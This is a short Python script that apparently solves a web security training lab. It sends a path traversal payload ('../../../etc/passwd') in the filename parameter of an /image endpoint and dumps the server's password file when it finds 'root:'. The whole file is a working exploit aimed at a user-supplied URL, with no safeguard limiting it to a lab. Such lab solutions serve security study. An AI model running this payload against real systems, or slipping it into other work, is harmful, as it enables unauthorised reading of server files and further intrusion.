import requests
from colorama import Fore
import sys

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 main.py <Lab_URL>")
        sys.exit(1)

    Lab_URL = sys.argv[1]
    params = {
        "filename": "../../../etc/passwd"
    }

    url = Lab_URL + '/image' 
    r = requests.get(url, params=params)
    print(Fore.CYAN + "Requested URL:", r.url)
    print(Fore.CYAN + "Status code for requested URL:", r.status_code)

    # Check if the substring "root:" is present in the content
    if "root:" in r.text:
        print(Fore.CYAN + "Dumping the Contents of /etc/passwd:")
        print(r.text)
        print(Fore.GREEN + "Lab is solved, Yay!!")
    else:
        print(Fore.RED + "Request failed. Try again later.")

if __name__ == "__main__":
    main()
